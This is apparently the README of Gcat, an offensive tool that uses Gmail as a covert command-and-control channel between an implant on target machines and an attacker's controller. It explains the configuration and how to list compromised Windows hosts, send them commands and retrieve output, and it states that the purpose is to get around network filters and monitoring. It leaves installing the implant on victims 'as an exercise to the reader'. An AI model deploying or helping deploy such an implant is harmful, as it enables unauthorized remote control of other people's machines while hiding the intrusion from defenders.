# Gcat - Gmail cat
[Documentation](https://adhdproject.github.io/#!Tools/Attack/Gcat.md)
Netcat is a familiar tool, perhaps most commonly used to send data and run commands over plaintext tcp sockets. Gcat is a spin on this functionality, using Gmail instead of raw sockets to communicate. The purpose of Gcat is to circumvent common network filters that may block direct outbound communication or sniff out suspicious network activity. An employee (seemingly) accessing gmail is less suspicious than an inexplicable tcp connection dumping data to some suspicious server.

### Usage
Gcat works via two python scripts, `implant.py`, run on target machines, and `gcat.py`, run on the attacker's machine. 

1) The first step is to configure the two scripts by inserting a few tailored variable assignments at the top of each of them, eg the following
```python
gmail_user = 'gcat.is.the.shit@gmail.com'
gmail_pwd = 'veryc00lp@ssw0rd' 
server = 'smtp.gmail.com' 
server_port = 587
```
Additionally, the gmail account used must be configured to work with "less secure apps." [More info here.](https://support.google.com/accounts/answer/6010255?hl=en)

2) The second step is to install and run your edition of `implant.py` on your desired target machine(s). How you do this is left as an exercise to the reader.

3) The third and final step is to command your target machines using your edition of `gcat.py`. Some examples of usage follow:

Listing available machines:
```sh
$ python ./gcat.py -list
	f964f907-dfcb-52ec-a993-543f6efc9e13 Windows-8-6.2.9200-x86 
	90b2cd83-cb36-52de-84ee-99db6ff41a11 Windows-XP-5.1.2600-SP3-x86
```
Running a command:
```sh
$ python ./gcat.py -id 90b2cd83-cb36-52de-84ee-99db6ff41a11 -cmd 'ipconfig /all'
	[*] Command sent successfully with jobid: SH3C4gv
```
Gcat does break away from traditional netcat, adding a layer of abstraction in the form of host and job IDs, but all in the pursuit of flexible control over Gmail.

Sending another request to retrieve the output from the command:
```sh
$ python ./gcat.py -id 90b2cd83-cb36-52de-84ee-99db6ff41a11 -jobid SH3C4gv
    DATE: 'Tue, 09 Jun 2015 06:51:44 -0700 (PDT)'
    JOBID: SH3C4gv 
    FG WINDOW: 'Command Prompt - C:\Python27\python.exe implant.py' 
    CMD: 'ipconfig /all'

	Windows IP Configuration 
		Host Name . . . . . . . . . . . . : unknown-2d44b52 
		Primary Dns Suffix . . . . . . . : 
		Node Type . . . . . . . . . . . . : 
		Unknown IP Routing Enabled. . . . . . . . : No 
		WINS Proxy Enabled. . . . . . . . : No
-- SNIP --
```
